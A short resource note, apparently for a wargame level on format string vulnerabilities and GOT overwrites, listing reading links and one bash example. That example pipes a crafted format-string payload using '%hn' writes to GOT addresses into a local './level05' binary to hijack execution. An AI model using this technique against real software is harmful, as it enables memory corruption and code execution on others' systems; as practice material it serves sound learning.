
Conceptual resources for Level05

This folder provides links about format string vulnerabilities, GOT overwrites and `%n`/`%hn` usage. The original walkthrough includes the exact commands and examples to use inside a 32-bit VM — no helper scripts are included here.


Recommended reading:

- Format string vulnerability overview: https://owasp.org/www-community/vulnerabilities/Format_string_attack
- GOT overwriting and exploitation: https://phrack.org/issues/49/14.html
- Practical format string exploitation examples: https://www.exploit-db.com/docs/english/20830-linux-format-string-exploitation.pdf

Example (run inside a 32-bit VM):

```bash
# Example: craft GOT overwrite payload (addresses/padding depend on runtime discovery)
(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%55308x%10$hn%10219x%11$hn"'; cat) | ./level05
```

